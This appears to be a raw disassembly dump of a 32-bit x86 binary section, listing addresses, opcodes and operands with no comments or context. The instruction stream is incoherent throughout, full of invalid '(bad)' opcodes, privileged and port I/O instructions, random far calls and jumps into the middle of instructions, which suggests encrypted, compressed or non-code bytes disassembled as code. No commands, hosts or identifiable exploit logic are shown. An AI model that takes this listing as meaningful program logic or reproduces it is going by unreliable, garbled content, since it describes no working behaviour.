  413ee4:	adc    BYTE PTR ds:0x2461b846,ch
  413eea:	push   esi
  413eeb:	pop    esi
  413eec:	rcl    DWORD PTR [ebx],0x79
  413eef:	sbb    ch,ch
  413ef1:	(bad)  
  413ef2:	xor    al,0x10
  413ef4:	mov    esi,0x86c092ea
  413ef9:	inc    esi
  413efa:	and    dh,BYTE PTR [edi+0x49]
  413efd:	jmp    0x413ed4
  413eff:	in     eax,dx
  413f00:	bound  esp,QWORD PTR [eax-0x62]
  413f03:	adc    BYTE PTR [edi+0x730aee44],0xa7
  413f0a:	in     al,0x1
  413f0c:	mov    ebp,ecx
  413f0e:	inc    ebx
  413f0f:	and    eax,DWORD PTR [edi]
  413f11:	stos   BYTE PTR es:[edi],al
  413f12:	mov    ebp,0x79de7b3d
  413f17:	jge    0x413eb1
  413f19:	add    esp,DWORD PTR [edx+ebp*1]
  413f1c:	add    al,BYTE PTR [ecx]
  413f1e:	outs   dx,BYTE PTR ds:[esi]
  413f1f:	add    eax,0xa6ce78a1
  413f24:	mov    edx,0x3642cef8
  413f29:	ret    0xd2cb
  413f2c:	jno    0x413f00
  413f2e:	clc    
  413f2f:	push   ebx
  413f30:	xchg   ecx,eax
  413f31:	outs   dx,DWORD PTR ds:[esi]
  413f32:	fisttp QWORD PTR [esi+0x38]
  413f35:	cli    
  413f36:	pushf  
  413f37:	leave  
  413f38:	leave  
  413f39:	(bad)  [esi+0x34f8084b]
  413f3f:	icebp  
  413f40:	pop    edi
  413f41:	retf   
  413f42:	repz mov ecx,0x1e1f558d
  413f48:	jne    0x413f82
  413f4a:	adc    DWORD PTR [ecx-0x5e8d6f40],ecx
  413f50:	xor    cl,BYTE PTR [edx+0x22]
  413f53:	cmc    
  413f54:	stos   BYTE PTR es:[edi],al
  413f55:	or     al,0xa3
  413f57:	xor    bh,BYTE PTR [ebx+0x5c612341]
  413f5d:	or     ch,0xfd
  413f60:	sub    dl,0xc9
  413f63:	outs   dx,BYTE PTR ds:[esi]
  413f64:	daa    
  413f65:	call   DWORD PTR [eax]
  413f67:	mov    BYTE PTR [eax],0x69
  413f6a:	mov    db7,edi
  413f6d:	push   ebp
  413f6e:	adc    al,0xf9
  413f70:	pop    ebx
  413f71:	ja     0x413fc3
  413f73:	jl     0x413f48
  413f75:	xchg   esp,eax
  413f76:	dec    esp
  413f77:	(bad)  
  413f78:	mov    edx,0x7857b58d
  413f7d:	adc    DWORD PTR [edi],ebx
  413f7f:	or     eax,0x4a9fe179
  413f84:	(bad)  
  413f85:	sub    al,0x4f
  413f87:	addr16 and edi,edi
  413f8a:	or     eax,0x5b81188e
  413f8f:	mov    ebx,0x19035708
  413f94:	jp     0x413f66
  413f96:	and    esi,0x4675f6f3
  413f9c:	sbb    al,0x15
  413f9e:	xor    DWORD PTR [ecx],eax
  413fa0:	ja     0x413f2a
  413fa2:	shl    BYTE PTR [eax-0x43],1
  413fa5:	lods   eax,DWORD PTR ds:[esi]
  413fa6:	test   al,0x58
  413fa8:	(bad)  
  413fa9:	sbb    esp,DWORD PTR [edx+edi*8-0x4ca73b15]
  413fb0:	ss dec eax
  413fb2:	ret    
  413fb3:	lahf   
  413fb4:	inc    esi
  413fb5:	or     eax,0xc9c58752
  413fba:	lahf   
  413fbb:	sahf   
  413fbc:	mov    al,0x98
  413fbe:	shl    BYTE PTR [eax+0x7d],cl
  413fc1:	int3   
  413fc2:	add    ecx,DWORD PTR [edi-0x42]
  413fc5:	dec    ebp
  413fc6:	mov    ch,0xc6
  413fc8:	mov    bh,BYTE PTR [esi+0x7c09457]
  413fce:	push   ebp
  413fcf:	cdq    
  413fd0:	pop    ebp
  413fd1:	jle    0x413fb8
  413fd3:	xor    ecx,DWORD PTR [ebx]
  413fd5:	and    DWORD PTR [eax],ebp
  413fd7:	or     BYTE PTR [eax+edi*2-0x6f806201],ah
  413fde:	aaa    
  413fdf:	add    al,ah
  413fe1:	cmp    DWORD PTR [edi-0x2],eax
  413fe4:	mov    ss,esi
  413fe6:	aaa    
  413fe7:	jmp    0x414038
  413fe9:	cmp    eax,0xb6702c49
  413fee:	inc    ebx
  413fef:	push   ds
  413ff0:	loope  0x413fae
  413ff2:	adc    eax,DWORD PTR [ecx]
  413ff4:	sbb    bl,BYTE PTR [edx+0x62d157bc]
  413ffa:	mul    esi
  413ffc:	sbb    BYTE PTR ds:0xb3398fbe,0x66
  414003:	adc    eax,0x4a0e9741
  414008:	imul   ecx,esi,0xe7470e81
  41400e:	cli    
  41400f:	jno    0x413fc7
  414011:	fistp  WORD PTR [edx-0x7c345fc]
  414017:	sbb    BYTE PTR [edi],ah
  414019:	dec    edi
  41401a:	pop    edi
  41401b:	pop    edx
  41401c:	lahf   
  41401d:	daa    
  41401e:	shl    BYTE PTR [esi-0x22],cl
  414021:	call   0xe6e0:0x5d06195d
  414028:	int3   
  414029:	xchg   BYTE PTR [esi+0x1c91f843],ch
  41402f:	sbb    al,0x14
  414031:	xchg   ecx,eax
  414032:	inc    eax
  414033:	sub    BYTE PTR [edx-0x1fdb23cc],al
  414039:	pop    ss
  41403a:	add    eax,0x74139fd6
  41403f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414040:	mov    bl,0xd3
  414042:	lods   eax,DWORD PTR ds:[esi]
  414043:	outs   dx,DWORD PTR ds:[esi]
  414044:	xchg   ecx,eax
  414045:	stc    
  414046:	pop    edi
  414047:	aaa    
  414048:	fs mov ebp,0xb27f2cee
  41404e:	mov    esi,0x423cdf55
  414053:	hlt    
  414054:	lea    esp,fs:[edx+0x24]
  414058:	inc    ecx
  414059:	xchg   ebp,eax
  41405a:	mov    BYTE PTR [ebx],cl
  41405c:	pop    ss
  41405d:	stos   DWORD PTR es:[edi],eax
  41405e:	fisub  DWORD PTR [edi-0x3a]
  414061:	push   0x49
  414063:	and    dl,cl
  414065:	in     al,0x9e
  414067:	jnp    0x414035
  414069:	inc    esi
  41406a:	lock dec esi
  41406c:	mov    dl,0x36
  41406e:	dec    edi
  41406f:	cmp    edx,0x47a73c3e
  414075:	sbb    eax,ebp
  414077:	leave  
  414078:	(bad)  
  414079:	xor    esi,DWORD PTR [eax+edi*4]
  41407c:	jb     0x41407e
  41407e:	or     BYTE PTR [ebp+0x17],dh
  414081:	ret    
  414082:	pop    ds
  414083:	add    eax,0x1a284d20
  414088:	(bad)  [edx-0x35e865c5]
  41408e:	hlt    
  41408f:	mov    ds:0x92772b92,al
  414094:	es js  0x414085
  414097:	sar    DWORD PTR [eax+0x791adb84],0xcb
  41409e:	test   BYTE PTR [eax],ah
  4140a0:	mov    al,0x68
  4140a2:	out    dx,al
  4140a3:	lds    ebx,FWORD PTR [ecx-0x481b307]
  4140a9:	ret    
  4140aa:	xchg   edi,eax
  4140ab:	call   0xa819:0xbdcf647
  4140b2:	lods   al,BYTE PTR ds:[esi]
  4140b3:	and    esp,DWORD PTR [eax]
  4140b5:	jnp    0x41411d
  4140b7:	inc    edi
  4140b8:	push   ebp
  4140b9:	xor    eax,0x29558eb1
  4140be:	xchg   ebp,eax
  4140bf:	push   ebp
  4140c0:	test   BYTE PTR [edi],ch
  4140c2:	test   BYTE PTR [edi-0x5dcb28d2],bl
  4140c8:	mov    bh,0xa2
  4140ca:	jne    0x414127
  4140cc:	mov    al,0x5e
  4140ce:	sahf   
  4140cf:	add    al,0xc7
  4140d1:	push   si
  4140d3:	aam    0x86
  4140d5:	pop    edi
  4140d6:	rol    DWORD PTR [edi-0x71869542],1
  4140dc:	xchg   ebp,eax
  4140dd:	test   eax,0xb96f6deb
  4140e2:	mov    ax,0xf79b
  4140e6:	shl    ecx,1
  4140e8:	sub    eax,0x7d4d63ab
  4140ed:	mov    cl,0xa5
  4140ef:	xor    al,0xc3
  4140f1:	cmp    ah,ch
  4140f3:	aam    0x4c
  4140f5:	dec    ecx
  4140f6:	shr    dl,0xe6
  4140f9:	pushf  
  4140fa:	shl    DWORD PTR [edi+0x76],0xf2
  4140fe:	adc    bl,BYTE PTR [ebx+0x3eaaeb4f]
  414104:	mov    dl,0x34
  414106:	xchg   BYTE PTR [ebx],dh
  414108:	(bad)  
  414109:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41410a:	daa    
  41410b:	xlat   BYTE PTR ds:[ebx]
  41410c:	mov    bh,0xd4
  41410e:	dec    ebp
  41410f:	mov    al,ds:0x2502e15a
  414114:	lods   al,BYTE PTR ds:[esi]
  414115:	fstp   DWORD PTR [edx]
  414117:	inc    ecx
  414118:	pop    esp
  414119:	sub    bh,BYTE PTR [esp+ebp*8-0x1510bfbf]
  414120:	xchg   BYTE PTR [esi],bh
  414122:	sbb    eax,0x93beaa69
  414127:	xchg   ecx,esp
  414129:	xchg   ecx,eax
  41412a:	mov    ds:0x7fb027ed,al
  41412f:	sar    BYTE PTR [esi],cl
  414131:	xchg   ecx,eax
  414132:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414133:	or     edx,DWORD PTR [ecx+eiz*2]
  414136:	(bad)  
  414139:	inc    ecx
  41413a:	scas   eax,DWORD PTR es:[edi]
  41413b:	nop
  41413c:	mov    ebx,0x17ba9d9e
  414141:	jmp    0xe5784e90
  414146:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414147:	and    eax,0xa97ab9c2
  41414c:	mov    ah,0xab
  41414e:	adc    esi,ebx
  414150:	cmp    edx,DWORD PTR [eax]
  414152:	jae    0x4141b5
  414154:	fnstsw WORD PTR [ecx]
  414156:	add    eax,0x398489e7
  41415b:	sbb    al,0xbe
  41415d:	popf   
  41415e:	test   al,0x54
  414160:	enter  0xbcd0,0xc9
  414164:	out    dx,al
  414165:	push   cs
  414166:	outs   dx,DWORD PTR ds:[esi]
  414167:	mov    al,0x51
  414169:	jge    0x414120
  41416b:	loope  0x41413b
  41416d:	and    edi,edi
  41416f:	fs jo  0x414195
  414172:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414173:	mov    esi,0x6fbc7eb5
  414178:	mov    dh,0x46
  41417a:	inc    ecx
  41417b:	lahf   
  41417c:	out    0xcb,al
  41417e:	les    esp,FWORD PTR [ebx+0x620501f6]
  414184:	jbe    0x41418d
  414186:	fbstp  TBYTE PTR ds:0x2f30fb12
  41418c:	fcom   DWORD PTR [ebx-0x71]
  41418f:	dec    eax
  414190:	inc    ecx
  414191:	rcr    DWORD PTR [edx],cl
  414193:	pop    eax
  414194:	dec    edx
  414195:	jno    0x4141d8
  414197:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414198:	cdq    
  414199:	xchg   edi,eax
  41419a:	adc    eax,0x691bbeab
  41419f:	outs   dx,BYTE PTR ds:[esi]
  4141a0:	call   0x24dc:0xe23d1f2d
  4141a7:	cli    
  4141a8:	jg     0x414181
  4141aa:	mov    cl,0x91
  4141ac:	mov    cl,ah
  4141ae:	mov    eax,DWORD PTR [ecx+0x74e7576b]
  4141b4:	rcr    DWORD PTR [esi+eax*4-0x2],1
  4141b8:	push   cs
  4141b9:	xor    BYTE PTR [edx-0x2],dh
  4141bc:	sbb    eax,0xdc0e6f8d
  4141c1:	addr16 test eax,0xcc7e8639
  4141c7:	mov    dh,BYTE PTR [edi]
  4141c9:	add    al,0xb6
  4141cb:	mov    ah,0x30
  4141cd:	or     DWORD PTR [ebx],edx
  4141cf:	sub    BYTE PTR [esp+eax*1-0x7c],al
  4141d3:	cld    
  4141d4:	jno    0x41417d
  4141d6:	inc    ebp
  4141d7:	fs js  0x414207
  4141da:	dec    esp
  4141db:	rcl    BYTE PTR [ebx],cl
  4141dd:	cmp    al,0x8c
  4141df:	test   eax,0x2c8bb94
  4141e4:	aaa    
  4141e5:	(bad)  [eax-0x281f248e]
  4141eb:	mov    esi,0x2742a0e0
  4141f0:	es xor eax,0x1a356b9e
  4141f6:	dec    ecx
  4141f7:	xchg   edi,eax
  4141f8:	aam    0x4d
  4141fa:	lds    esi,FWORD PTR [eax+0xc]
  4141fd:	sub    DWORD PTR [edx-0x6d],ebp
  414200:	pop    ss
  414201:	cli    
  414202:	imul   esi,DWORD PTR [eax],0xe558dcbe
  414208:	push   ds
  414209:	mov    BYTE PTR [edi+0x2],bh
  41420c:	(bad)  [ecx+0x4a]
  41420f:	test   DWORD PTR [edi],ecx
  414211:	jge    0x414280
  414213:	adc    BYTE PTR [ebp-0xc],dl
  414216:	jbe    0x41428e
  414218:	jcxz   0x41421f
  41421b:	jle    0x414207
  41421d:	dec    ebx
  41421e:	mov    al,ds:0x519e3c90
  414223:	push   ebx
  414224:	add    ch,BYTE PTR [esi]
  414226:	cwde   
  414227:	push   cs
  414228:	inc    edi
  414229:	mov    edi,0xb4cd530f
  41422e:	pop    edi
  41422f:	cld    
  414230:	inc    ebx
  414231:	aas    
  414232:	push   esp
  414233:	daa    
  414234:	mov    dl,dh
  414236:	retf   
  414237:	iret   
  414238:	retf   
  414239:	nop
  41423a:	lea    eax,[eax+0xd6eadb7]
  414240:	push   ss
  414241:	out    dx,al
  414242:	cmp    edx,eax
  414244:	in     eax,0x5d
  414246:	inc    ebp
  414247:	xlat   BYTE PTR ds:[ebx]
  414248:	pop    esp
  414249:	pop    ds
  41424a:	push   edx
  41424b:	shl    BYTE PTR [edi+eax*2-0x67],1
  41424f:	sub    DWORD PTR [eax+0x57],0xb93b61
  414256:	or     DWORD PTR [ebp-0x4],0xffffffb5
  41425a:	cmc    
  41425b:	lods   al,BYTE PTR ds:[esi]
  41425c:	jle    0x4141f3
  41425e:	dec    ebp
  41425f:	loop   0x414227
  414261:	test   eax,0x5441e019
  414266:	mov    ecx,eax
  414268:	std    
  414269:	dec    esp
  41426a:	mov    esp,0x12153329
  41426f:	sub    ebp,DWORD PTR [ebx-0x45b8345d]
  414275:	das    
  414276:	jae    0x4142f3
  414278:	mov    WORD PTR [ecx],es
  41427a:	call   0x8f98:0x7b1b3b24
  414281:	fwait
  414282:	jbe    0x4142a0
  414284:	imul   edi,DWORD PTR [ebp-0x15875b87],0xc6f56c20
  41428e:	outs   dx,BYTE PTR ds:[esi]
  41428f:	mov    edx,0x9400c5b0
  414294:	jno    0x414225
  414296:	aam    0x33
  414298:	add    al,0x6
  41429a:	(bad)  
  41429b:	call   0x80fd:0xc4c5e01c
  4142a2:	es imul ebp,esi,0x13
  4142a6:	sbb    edi,0xffffff97
  4142a9:	hlt    
  4142aa:	mov    bl,0x60
  4142ac:	arpl   ax,bp
  4142ae:	pop    es
  4142af:	xchg   ebp,eax
  4142b0:	js     0x41423e
  4142b2:	mov    WORD PTR [edi],es
  4142b4:	seto   bh
  4142b7:	lock aad 0x56
  4142ba:	mov    ebx,DWORD PTR [eax-0x45]
  4142bd:	aam    0x58
  4142bf:	adc    BYTE PTR [esi],al
  4142c1:	cdq    
  4142c2:	repz xchg esi,eax
  4142c4:	sbb    al,0xd9
  4142c6:	jp     0x41426d
  4142c8:	fwait
  4142c9:	xchg   edx,eax
  4142ca:	in     eax,dx
  4142cb:	mov    eax,0x4c0661f2
  4142d0:	jg     0x414329
  4142d2:	sub    eax,0x4cd33b58
  4142d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4142d8:	xor    eax,0xa7bd1bca
  4142dd:	jb     0x414276
  4142df:	inc    eax
  4142e0:	sub    DWORD PTR [esi+0x4f3d5c58],0xef8fc2d2
  4142ea:	xchg   edi,eax
  4142eb:	push   esi
  4142ec:	pop    ebp
  4142ed:	cmp    eax,0x6628cc07
  4142f2:	sub    al,BYTE PTR [edx-0x56]
  4142f5:	fisubr WORD PTR cs:[esi+eax*8]
  4142f9:	cmp    al,0xab
  4142fb:	lock lea eax,[ebx+eiz*2]
  4142ff:	mov    ecx,0x5f8be879
  414304:	push   0xffffffef
  414306:	sub    BYTE PTR [ebp-0x64],cl
  414309:	jno    0x41432c
  41430b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41430c:	scas   eax,DWORD PTR es:[edi]
  41430d:	sub    ebp,ebx
  41430f:	fst    st(3)
  414311:	jmp    0x4142bd
  414313:	(bad)  
  414314:	mov    edx,0xa150005
  414319:	push   0x9862ea37
  41431e:	sahf   
  41431f:	and    al,0x3
  414321:	push   ds
  414322:	or     BYTE PTR [edi+0x475ec3cf],ch
  414328:	(bad)  [ebp-0x1f]
  41432b:	mov    eax,ds:0x58b10409
  414330:	std    
  414331:	arpl   sp,sp
  414333:	loop   0x414354
  414335:	data16 mov bl,0xd1
  414338:	xchg   edx,eax
  414339:	xchg   ecx,eax
  41433a:	jg     0x414310
  41433c:	js     0x414380
  41433e:	in     al,dx
  41433f:	inc    edi
  414340:	repnz gs std 
  414343:	mov    ecx,0x7d7fbe0
  414348:	mov    bl,0x64
  41434a:	or     ah,BYTE PTR [ecx]
  41434c:	add    edi,DWORD PTR [edi+0x1090bc8c]
  414352:	mov    ecx,0x34b4e57d
  414357:	xchg   esi,eax
  414358:	enter  0x4078,0xc4
  41435c:	or     eax,0xf9d353ee
  414361:	stos   DWORD PTR es:[edi],eax
  414362:	shr    bl,1
  414364:	pop    edi
  414365:	lahf   
  414366:	add    ecx,DWORD PTR ss:[eax-0x385dd5ae]
  41436d:	in     ax,0xa3
  414370:	adc    BYTE PTR gs:[ecx-0x37366a0f],0xa9
  414378:	jne    0x4143e9
  41437a:	lods   eax,DWORD PTR ds:[esi]
  41437b:	push   0xf788467e
  414380:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414381:	loopne 0x4143b8
  414383:	and    BYTE PTR [eax],ah
  414385:	inc    esp
  414386:	aaa    
  414387:	out    dx,al
  414388:	bound  eax,QWORD PTR [ecx]
  41438a:	mov    ds:0xd50c2b22,al
  41438f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414391:	add    al,0x4a
  414393:	jmp    0x41436f
  414395:	ins    DWORD PTR es:[edi],dx
  414396:	xchg   ecx,eax
  414397:	leave  
  414398:	or     BYTE PTR [ebp-0xb604fe],al
  41439e:	push   0x33
  4143a0:	mov    dl,al
  4143a2:	add    eax,ebx
  4143a4:	jge    0x414407
  4143a6:	fmulp  st(6),st
  4143a8:	jecxz  0x4143c9
  4143aa:	cld    
  4143ab:	fld    TBYTE PTR [ebx-0x52]
  4143ae:	jmp    0x4143b7
  4143b0:	xor    esi,DWORD PTR [eax+eax*2]
  4143b3:	pop    ebp
  4143b4:	or     cl,dl
  4143b6:	dec    esp
  4143b7:	push   ebx
  4143b8:	rcl    BYTE PTR [ebx+0x2c525694],1
  4143be:	iret   
  4143bf:	and    eax,0x8cfed513
  4143c4:	call   0x4d6c:0x500fc47c
  4143cb:	enter  0xfc52,0x4b
  4143cf:	mov    DWORD PTR [ebp-0x44],ecx
  4143d2:	xor    bl,BYTE PTR [eax+ebp*2+0x1c]
  4143d6:	pop    ecx
  4143d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4143d9:	stos   BYTE PTR es:[edi],al
  4143da:	sbb    ebx,ecx
  4143dc:	pusha  
  4143dd:	cmc    
  4143de:	or     edx,DWORD PTR [esp+eax*8+0x961a3b7]
  4143e5:	iret   
  4143e6:	int    0x5b
  4143e8:	mov    bh,BYTE PTR [esi*8+0x18915d62]
  4143ef:	add    bl,0x4d
  4143f2:	add    al,0xcf
  4143f4:	repnz (bad) 
  4143f6:	out    dx,al
  4143f7:	push   edi
  4143f8:	stos   DWORD PTR es:[edi],eax
  4143f9:	add    edi,esp
  4143fb:	xor    ebp,DWORD PTR [eax+edx*2]
  4143fe:	jbe    0x4143bd
  414400:	stos   DWORD PTR es:[edi],eax
  414401:	pushf  
  414402:	pop    es
  414403:	les    ecx,FWORD PTR [edx-0xc2acf40]
  414409:	shl    BYTE PTR [ecx],0x65
  41440c:	jnp    0x41445d
  41440e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41440f:	in     eax,0x5f
  414411:	rcr    BYTE PTR [ebp+edi*1-0x6e434346],1
  414418:	pusha  
  414419:	push   es
  41441a:	jmp    0x414490
  41441c:	lds    esi,FWORD PTR [eax+0x71]
  41441f:	fcomp  QWORD PTR [edx+0x77]
  414422:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414423:	mov    al,ds:0xee45f0b5
  414428:	sub    ch,dh
  41442a:	fwait
  41442b:	out    dx,eax
  41442c:	dec    esp
  41442d:	inc    esi
  41442e:	addr16 lock mov ebx,0x347a8a7e
  414435:	cmc    
  414436:	dec    edx
  414437:	jbe    0x4143e1
  414439:	adc    DWORD PTR [eax],ebp
  41443b:	aad    0xcd
  41443d:	sub    DWORD PTR ds:0xbd5ad3d,0x78
  414444:	hlt    
  414445:	in     eax,0xff
  414447:	jl     0x4144c1
  414449:	(bad)  
  41444a:	imul   eax,DWORD PTR [esi+0x745bc49a],0xffffffae
  414451:	cmp    cl,BYTE PTR [eax+0x3e40ed9e]
  414457:	jnp    0x4143e7
  414459:	and    DWORD PTR [ecx+0x7aeb1421],edi
  41445f:	inc    edx
  414460:	icebp  
  414461:	push   edi
  414462:	clc    
  414463:	push   esi
  414464:	loop   0x4144c9
  414466:	xchg   ecx,eax
  414467:	outs   dx,BYTE PTR ds:[esi]
  414468:	sub    al,0x23
  41446b:	push   edi
  41446c:	fwait
  41446d:	dec    esp
  41446e:	je     0x414417
  414470:	sbb    ah,bh
  414472:	inc    edi
  414473:	cmp    esp,0xa2eac28c
  414479:	iret   
  41447a:	adc    eax,0x7b47ebec
  41447f:	and    al,0xc2
  414481:	or     BYTE PTR [ecx-0x7e],dl
  414484:	inc    ebp
  414485:	pop    eax
  414486:	mov    ecx,0xcac4b3ab
  41448b:	adc    al,0xe4
  41448d:	ror    DWORD PTR [eax+ebx*8-0x39],0x19
  414492:	or     dl,BYTE PTR [esi+0x34]
  414495:	mov    ebp,0xcb3b5f10
  41449a:	push   cs
  41449b:	push   edi
  41449c:	adc    al,0x12
  41449e:	xchg   ebp,eax
  41449f:	retf   0xfb2b
  4144a2:	cmp    bl,0x7b
  4144a5:	xor    al,0x10
  4144a7:	outs   dx,BYTE PTR ds:[esi]
  4144a8:	push   cs
  4144a9:	ja     0x41445c
  4144ab:	mov    ds:0x9ecd66e7,al
  4144b0:	nop
  4144b1:	cmc    
  4144b2:	sbb    BYTE PTR [ecx-0x2e092fa1],bh
  4144b8:	sub    eax,0xd790f8c5
  4144bd:	mov    bx,WORD PTR [ebx+ebx*4]
  4144c1:	mov    ah,0xdc
  4144c3:	dec    ebx
  4144c4:	sub    DWORD PTR [ecx],esi
  4144c6:	jmp    0xdebdfc91
  4144cb:	xor    dl,bh
  4144cd:	pushf  
  4144ce:	jmp    0x4144e4
  4144d0:	jno    0x414511
  4144d2:	lds    ecx,FWORD PTR cs:[edi+0x33d032bc]
  4144d9:	popa   
  4144da:	sub    al,0xb3
  4144dc:	int    0xfc
  4144de:	xchg   edx,eax
  4144df:	mov    ds:0xb07900c,al
  4144e4:	or     eax,DWORD PTR [edx+0x3d]
  4144e7:	jmp    DWORD PTR [esi+esi*2+0x2c]
  4144eb:	cmc    
  4144ec:	(bad)  [ebp-0x4f3e43a4]
  4144f2:	cmc    
  4144f3:	jo     0x4144c3
  4144f5:	je     0x414486
  4144f7:	push   ecx
  4144f8:	shl    ch,1
  4144fa:	dec    ecx
  4144fb:	arpl   WORD PTR [edx*4-0x3c8695b],cx
  414502:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414503:	xor    DWORD PTR [ecx],edx
  414505:	mov    ebx,ebx
  414507:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414508:	sbb    BYTE PTR [esi-0x2b],al
  41450b:	push   ebp
  41450c:	xlat   BYTE PTR es:[ebx]
  41450e:	out    0xd1,eax
  414510:	lods   eax,DWORD PTR ds:[esi]
  414511:	push   ds
  414512:	fld    DWORD PTR [eax-0x34]
  414515:	sbb    eax,0x1c09a88f
  41451a:	sbb    BYTE PTR [esp+eax*2+0x2e],dl
  41451e:	enter  0xf62d,0x35
  414522:	outs   dx,DWORD PTR ds:[esi]
  414523:	pop    esi
  414524:	pushf  
  414525:	gs or  dh,0x99
  414529:	in     eax,0xa3
  41452b:	cmp    eax,0x299941ed
  414530:	cmp    DWORD PTR [eax-0x4cc31760],edx
  414536:	pop    esp
  414537:	(bad)  
  414538:	pop    ebx
  414539:	and    BYTE PTR [eax],dl
  41453b:	dec    ebp
  41453c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41453d:	jns    0x414543
  41453f:	push   ebx
  414540:	pusha  
  414541:	mov    ecx,0xd328edb6
  414546:	xchg   esi,eax
  414547:	(bad)  
  414548:	or     ecx,DWORD PTR [ebx-0x43]
  41454b:	xor    al,0x8b
  41454d:	xchg   esi,eax
  41454e:	mov    BYTE PTR [esi],al
  414550:	out    dx,eax
  414551:	int    0x3d
  414553:	jp     0x41451d
  414555:	lock cmp ebx,0x15
  414559:	es mov dl,0x96
  41455c:	cmc    
  41455d:	aaa    
  41455e:	push   ds
  41455f:	mov    al,ds:0x26d9eb4
  414564:	xor    DWORD PTR [eax],ebp
  414566:	sbb    BYTE PTR ds:0x51eaad5e,al
  41456c:	jbe    0x41459d
  41456e:	sub    BYTE PTR [esi+0x534a6c8a],0xba
  414575:	aam    0xa7
  414577:	xlat   BYTE PTR ds:[ebx]
  414578:	xchg   edi,eax
  414579:	jb     0x41457e
  41457b:	push   edi
  41457c:	jecxz  0x4145fa
  41457e:	xor    esp,DWORD PTR [ebp-0x555e972f]
  414584:	gs pop ss
  414586:	imul   ebx,DWORD PTR [ebp-0x47],0x46218397
  41458d:	ror    DWORD PTR [ebx+ebp*4+0x2a],0xe
  414592:	cmp    al,0x6c
  414594:	adc    edi,DWORD PTR [edx+0xb]
  414597:	xchg   ebx,eax
  414598:	inc    esp
  414599:	arpl   WORD PTR [esi-0x4a],cx
  41459c:	pop    ecx
  41459d:	retf   
  41459e:	jp     0x41458e
  4145a0:	push   0xfffffff8
  4145a2:	(bad)  
  4145a3:	hlt    
  4145a4:	jnp    0x414578
  4145a6:	mov    esi,0xa3f5d276
  4145ab:	mov    edx,0x58083621
  4145b0:	idiv   DWORD PTR [esi+edx*8]
  4145b3:	cmp    DWORD PTR fs:[ebx+0x6d],ebp
  4145b7:	cli    
  4145b8:	push   0xc00fcbab
  4145bd:	rcl    edi,1
  4145bf:	leave  
  4145c0:	push   cs
  4145c1:	ds pop esp
  4145c3:	dec    esi
  4145c4:	mov    eax,0x16c71f4a
  4145c9:	adc    eax,0xe36fa339
  4145ce:	mov    ebp,0xf6261659
  4145d3:	mov    edx,0x2695b27a
  4145d8:	(bad)  
  4145d9:	(bad)  
  4145db:	aad    0xf7
  4145dd:	ins    DWORD PTR es:[edi],dx
  4145de:	fisttp DWORD PTR [edx-0x6e]
  4145e1:	cmp    DWORD PTR [ecx],ecx
  4145e3:	arpl   si,ax
  4145e5:	sbb    esi,edx
  4145e7:	loop   0x4145b4
  4145e9:	push   eax
  4145ea:	jmp    0x8bbd6167
  4145ef:	fsub   st(5),st
  4145f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4145f2:	pop    ax
  4145f4:	push   0x5d89ec89
  4145f9:	pxor   mm0,QWORD PTR [esi+eax*8-0x6098f734]
  414601:	pop    edi
  414602:	xchg   edx,eax
  414603:	pop    eax
  414604:	int    0xd5
  414606:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414607:	mov    ds:0x1173c55a,al
  41460c:	cmp    esi,DWORD PTR [ebx]
  41460e:	dec    edx
  41460f:	pop    ebx
  414610:	clc    
  414611:	dec    DWORD PTR [ebx-0x56]
  414614:	ins    BYTE PTR es:[edi],dx
  414615:	dec    edi
  414616:	ins    BYTE PTR es:[edi],dx
  414617:	pusha  
  414618:	xor    BYTE PTR [ecx+0x10241c73],dl
  41461e:	push   edi
  41461f:	adc    eax,0xbf42eea1
  414624:	jle    0x4146a0
  414626:	pusha  
  414627:	mov    cl,0xa3
  414629:	adc    esp,DWORD PTR [esi]
  41462b:	push   0x1a
  41462d:	jmp    DWORD PTR [esi]
  41462f:	push   es
  414630:	jl     0x41461e
  414632:	retf   
  414633:	sbb    BYTE PTR [eax-0x68],ch
  414636:	mov    esp,0x4e5d27e8
  41463b:	pusha  
  41463c:	mov    dl,0x15
  41463e:	or     esi,ebp
  414640:	repz adc cl,BYTE PTR [edi+0x62e9e0f0]
  414647:	push   ebp
  414648:	pop    ds
  414649:	mov    al,ds:0xa1c5d380
  41464e:	fldenv [ebx+0x46]
  414651:	scas   eax,DWORD PTR es:[edi]
  414652:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414653:	mov    edx,edx
  414655:	add    bh,BYTE PTR [eax+0x4c]
  414658:	sbb    eax,0xe54d31de
  41465d:	push   0x3d0db95b
  414662:	push   0xb5696284
  414667:	or     eax,0xb4c91e73
  41466c:	sub    BYTE PTR [ecx],cl
  41466e:	fs das 
  414670:	sbb    bl,dl
  414672:	addr16 pop esp
  414674:	sub    BYTE PTR [esi],bl
  414676:	cmc    
  414677:	pop    edi
  414678:	imul   esp,DWORD PTR [ecx],0xffffffc4
  41467b:	ret    0x4836
  41467e:	gs jae 0x4146e1
  414681:	jo     0x414634
  414683:	(bad)  
  414684:	sub    eax,0xbc44cdf8
  414689:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41468a:	js     0x414699
  41468c:	pushf  
  41468d:	inc    esi
  41468e:	stos   DWORD PTR es:[edi],eax
  41468f:	pop    es
  414690:	std    
  414691:	and    BYTE PTR [eax+0x2b916212],bl
  414697:	(bad)  
  414698:	popf   
  414699:	mov    ch,0x19
  41469b:	sub    eax,0xc4b790b3
  4146a0:	push   ds
  4146a1:	add    BYTE PTR [ebx+0xa06f325],dl
